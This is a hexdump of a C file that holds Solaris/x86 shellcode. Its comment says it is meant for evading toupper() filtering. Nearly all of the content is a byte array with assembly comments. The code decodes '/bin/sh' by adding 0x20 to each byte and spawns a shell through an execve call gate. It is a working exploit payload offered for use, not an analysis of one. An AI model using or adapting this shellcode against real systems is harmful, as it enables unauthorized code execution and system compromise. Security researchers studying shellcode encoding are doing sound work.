00000000  2f 2a 20 0d 0a 20 2a 20  20 53 6f 6c 61 72 69 73  |/* .. *  Solaris|
00000010  2f 78 38 36 0d 0a 20 2a  0d 0a 20 2a 20 20 55 73  |/x86.. *.. *  Us|
00000020  65 64 20 66 6f 72 20 74  6f 75 70 70 65 72 28 29  |ed for toupper()|
00000030  20 65 76 61 73 69 6f 6e  20 28 6c 6f 6f 6b 20 74  | evasion (look t|
00000040  6f 20 74 68 65 20 6c 69  6e 75 78 20 76 65 72 73  |o the linux vers|
00000050  69 6f 6e 20 66 6f 72 20  61 6e 20 0d 0a 20 2a 20  |ion for an .. * |
00000060  20 65 78 70 6c 61 6e 61  74 69 6f 6e 20 61 6e 64  | explanation and|
00000070  20 75 73 61 67 65 20 65  78 61 6d 70 6c 65 29 2e  | usage example).|
00000080  20 0d 0a 20 2a 2f 0d 0a  20 0d 0a 63 68 61 72 20  | .. */.. ..char |
00000090  63 30 64 65 5b 5d 20 3d  20 0d 0a 2f 2a 20 6d 61  |c0de[] = ../* ma|
000000a0  69 6e 3a 20 2a 2f 0d 0a  22 5c 78 65 62 5c 78 33  |in: */.."\xeb\x3|
000000b0  33 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3"              |
000000c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000d0  20 20 2f 2a 20 6a 6d 70  20 63 61 6c 6c 7a 20 20  |  /* jmp callz  |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2a 2f  |              */|
000000f0  0d 0a 2f 2a 20 73 74 61  72 74 3a 20 2a 2f 0d 0a  |../* start: */..|
00000100  22 5c 78 35 65 22 20 20  20 20 20 20 20 20 20 20  |"\x5e"          |
00000110  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000120  20 20 20 20 20 20 20 20  20 20 2f 2a 20 70 6f 70  |          /* pop|
00000130  6c 20 25 65 73 69 20 20  20 20 20 20 20 20 20 20  |l %esi          |
00000140  20 20 20 20 20 20 2a 2f  0d 0a 22 5c 78 38 64 5c  |      */.."\x8d\|
00000150  78 30 36 22 20 20 20 20  20 20 20 20 20 20 20 20  |x06"            |
00000160  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000170  20 20 20 20 2f 2a 20 6c  65 61 6c 20 28 25 65 73  |    /* leal (%es|
00000180  69 29 2c 20 25 65 61 78  20 20 20 20 20 20 20 20  |i), %eax        |
00000190  2a 2f 0d 0a 22 5c 78 32  39 5c 78 63 39 22 20 20  |*/.."\x29\xc9"  |
000001a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
000001c0  20 73 75 62 6c 20 25 65  63 78 2c 20 25 65 63 78  | subl %ecx, %ecx|
000001d0  20 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 22 5c  |          */.."\|
000001e0  78 38 39 5c 78 66 33 22  20 20 20 20 20 20 20 20  |x89\xf3"        |
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000200  20 20 20 20 20 20 20 20  2f 2a 20 6d 6f 76 6c 20  |        /* movl |
00000210  25 65 73 69 2c 20 25 65  62 78 20 20 20 20 20 20  |%esi, %ebx      |
00000220  20 20 20 20 2a 2f 0d 0a  22 5c 78 38 39 5c 78 35  |    */.."\x89\x5|
00000230  65 5c 78 30 38 22 20 20  20 20 20 20 20 20 20 20  |e\x08"          |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000250  20 20 2f 2a 20 6d 6f 76  6c 20 25 65 62 78 2c 20  |  /* movl %ebx, |
00000260  30 78 30 38 28 25 65 73  69 29 20 20 20 20 2a 2f  |0x08(%esi)    */|
00000270  0d 0a 22 5c 78 62 31 5c  78 30 37 22 20 20 20 20  |.."\xb1\x07"    |
00000280  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000290  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 6d  |            /* m|
000002a0  6f 76 62 20 24 30 78 30  37 2c 20 25 63 6c 20 20  |ovb $0x07, %cl  |
000002b0  20 20 20 20 20 20 20 20  2a 2f 0d 0a 2f 2a 20 6c  |        */../* l|
000002c0  6f 6f 70 7a 3a 20 2a 2f  0d 0a 22 5c 78 38 30 5c  |oopz: */.."\x80\|
000002d0  78 30 33 5c 78 32 30 22  20 20 20 20 20 20 20 20  |x03\x20"        |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002f0  20 20 20 20 2f 2a 20 61  64 64 62 20 24 30 78 32  |    /* addb $0x2|
00000300  30 2c 20 28 25 65 62 78  29 20 20 20 20 20 20 20  |0, (%ebx)       |
00000310  2a 2f 0d 0a 22 5c 78 34  33 22 20 20 20 20 20 20  |*/.."\x43"      |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000330  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
00000340  20 69 6e 63 6c 20 25 65  62 78 20 20 20 20 20 20  | incl %ebx      |
00000350  20 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 22 5c  |          */.."\|
00000360  78 65 30 5c 78 66 61 22  20 20 20 20 20 20 20 20  |xe0\xfa"        |
00000370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000380  20 20 20 20 20 20 20 20  2f 2a 20 6c 6f 6f 70 6e  |        /* loopn|
00000390  65 20 6c 6f 6f 70 7a 20  20 20 20 20 20 20 20 20  |e loopz         |
000003a0  20 20 20 20 2a 2f 0d 0a  22 5c 78 39 33 22 20 20  |    */.."\x93"  |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000003d0  20 20 2f 2a 20 78 63 68  67 6c 20 25 65 61 78 2c  |  /* xchgl %eax,|
000003e0  20 25 65 62 78 20 20 20  20 20 20 20 20 20 2a 2f  | %ebx         */|
000003f0  0d 0a 22 5c 78 32 39 5c  78 63 30 22 20 20 20 20  |.."\x29\xc0"    |
00000400  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000410  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 73  |            /* s|
00000420  75 62 6c 20 25 65 61 78  2c 20 25 65 61 78 20 20  |ubl %eax, %eax  |
00000430  20 20 20 20 20 20 20 20  2a 2f 0d 0a 22 5c 78 38  |        */.."\x8|
00000440  39 5c 78 35 65 5c 78 30  62 22 20 20 20 20 20 20  |9\x5e\x0b"      |
00000450  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000460  20 20 20 20 20 20 2f 2a  20 6d 6f 76 6c 20 25 65  |      /* movl %e|
00000470  62 78 2c 20 30 78 30 62  28 25 65 73 69 29 20 20  |bx, 0x0b(%esi)  |
00000480  20 20 2a 2f 0d 0a 22 5c  78 32 39 5c 78 64 32 22  |  */.."\x29\xd2"|
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000004b0  2f 2a 20 73 75 62 6c 20  25 65 64 78 2c 20 25 65  |/* subl %edx, %e|
000004c0  64 78 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |dx          */..|
000004d0  22 5c 78 38 38 5c 78 35  36 5c 78 31 39 22 20 20  |"\x88\x56\x19"  |
000004e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004f0  20 20 20 20 20 20 20 20  20 20 2f 2a 20 6d 6f 76  |          /* mov|
00000500  62 20 25 64 6c 2c 20 30  78 31 39 28 25 65 73 69  |b %dl, 0x19(%esi|
00000510  29 20 20 20 20 20 2a 2f  0d 0a 22 5c 78 38 39 5c  |)     */.."\x89\|
00000520  78 35 36 5c 78 30 37 22  20 20 20 20 20 20 20 20  |x56\x07"        |
00000530  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000540  20 20 20 20 2f 2a 20 6d  6f 76 6c 20 25 65 64 78  |    /* movl %edx|
00000550  2c 20 30 78 30 37 28 25  65 73 69 29 20 20 20 20  |, 0x07(%esi)    |
00000560  2a 2f 0d 0a 22 5c 78 38  39 5c 78 35 36 5c 78 30  |*/.."\x89\x56\x0|
00000570  66 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |f"              |
00000580  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
00000590  20 6d 6f 76 6c 20 25 65  64 78 2c 20 30 78 30 66  | movl %edx, 0x0f|
000005a0  28 25 65 73 69 29 20 20  20 20 2a 2f 0d 0a 22 5c  |(%esi)    */.."\|
000005b0  78 38 39 5c 78 35 36 5c  78 31 34 22 20 20 20 20  |x89\x56\x14"    |
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005d0  20 20 20 20 20 20 20 20  2f 2a 20 6d 6f 76 6c 20  |        /* movl |
000005e0  25 65 64 78 2c 20 30 78  31 34 28 25 65 73 69 29  |%edx, 0x14(%esi)|
000005f0  20 20 20 20 2a 2f 0d 0a  22 5c 78 62 30 5c 78 33  |    */.."\xb0\x3|
00000600  62 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |b"              |
00000610  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000620  20 20 2f 2a 20 6d 6f 76  62 20 24 30 78 33 62 2c  |  /* movb $0x3b,|
00000630  20 25 61 6c 20 20 20 20  20 20 20 20 20 20 2a 2f  | %al          */|
00000640  0d 0a 22 5c 78 38 64 5c  78 34 65 5c 78 30 62 22  |.."\x8d\x4e\x0b"|
00000650  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000660  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 6c  |            /* l|
00000670  65 61 6c 20 30 78 30 62  28 25 65 73 69 29 2c 20  |eal 0x0b(%esi), |
00000680  25 65 63 78 20 20 20 20  2a 2f 0d 0a 22 5c 78 38  |%ecx    */.."\x8|
00000690  39 5c 78 63 61 22 20 20  20 20 20 20 20 20 20 20  |9\xca"          |
000006a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006b0  20 20 20 20 20 20 2f 2a  20 6d 6f 76 6c 20 25 65  |      /* movl %e|
000006c0  63 78 2c 20 25 65 64 78  20 20 20 20 20 20 20 20  |cx, %edx        |
000006d0  20 20 2a 2f 0d 0a 22 5c  78 35 32 22 20 20 20 20  |  */.."\x52"    |
000006e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000700  2f 2a 20 70 75 73 68 6c  20 25 65 64 78 20 20 20  |/* pushl %edx   |
00000710  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |            */..|
00000720  22 5c 78 35 31 22 20 20  20 20 20 20 20 20 20 20  |"\x51"          |
00000730  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000740  20 20 20 20 20 20 20 20  20 20 2f 2a 20 70 75 73  |          /* pus|
00000750  68 6c 20 25 65 63 78 20  20 20 20 20 20 20 20 20  |hl %ecx         |
00000760  20 20 20 20 20 20 2a 2f  0d 0a 22 5c 78 35 33 22  |      */.."\x53"|
00000770  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000790  20 20 20 20 2f 2a 20 70  75 73 68 6c 20 25 65 62  |    /* pushl %eb|
000007a0  78 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |x               |
000007b0  2a 2f 0d 0a 22 5c 78 35  30 22 20 20 20 20 20 20  |*/.."\x50"      |
000007c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
000007e0  20 70 75 73 68 6c 20 25  65 61 78 20 20 20 20 20  | pushl %eax     |
000007f0  20 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 22 5c  |          */.."\|
00000800  78 65 62 5c 78 31 38 22  20 20 20 20 20 20 20 20  |xeb\x18"        |
00000810  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000820  20 20 20 20 20 20 20 20  2f 2a 20 6a 6d 70 20 6c  |        /* jmp l|
00000830  63 61 6c 6c 20 20 20 20  20 20 20 20 20 20 20 20  |call            |
00000840  20 20 20 20 2a 2f 0d 0a  2f 2a 20 63 61 6c 6c 7a  |    */../* callz|
00000850  3a 20 2a 2f 0d 0a 22 5c  78 65 38 5c 78 63 38 5c  |: */.."\xe8\xc8\|
00000860  78 66 66 5c 78 66 66 5c  78 66 66 22 20 20 20 20  |xff\xff\xff"    |
00000870  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000880  2f 2a 20 63 61 6c 6c 20  73 74 61 72 74 20 20 20  |/* call start   |
00000890  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |            */..|
000008a0  0d 0a 22 5c 78 30 66 5c  78 34 32 5c 78 34 39 5c  |.."\x0f\x42\x49\|
000008b0  78 34 65 5c 78 30 66 5c  78 35 33 5c 78 34 38 22  |x4e\x0f\x53\x48"|
000008c0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 2f  |            /* /|
000008d0  62 69 6e 2f 73 68 20 2d  3d 20 30 78 32 30 20 20  |bin/sh -= 0x20  |
000008e0  20 20 20 20 20 20 20 20  2a 2f 0d 0a 22 5c 78 30  |        */.."\x0|
000008f0  31 5c 78 30 31 5c 78 30  31 5c 78 30 31 5c 78 30  |1\x01\x01\x01\x0|
00000900  32 5c 78 30 32 5c 78 30  32 5c 78 30 32 5c 78 30  |2\x02\x02\x02\x0|
00000910  33 5c 78 30 33 5c 78 30  33 5c 78 30 33 22 0d 0a  |3\x03\x03\x03"..|
00000920  2f 2a 20 6c 63 61 6c 6c  3a 20 2a 2f 0d 0a 22 5c  |/* lcall: */.."\|
00000930  78 39 61 5c 78 30 34 5c  78 30 34 5c 78 30 34 5c  |x9a\x04\x04\x04\|
00000940  78 30 34 5c 78 30 37 5c  78 30 34 22 3b           |x04\x07\x04";|
0000094d
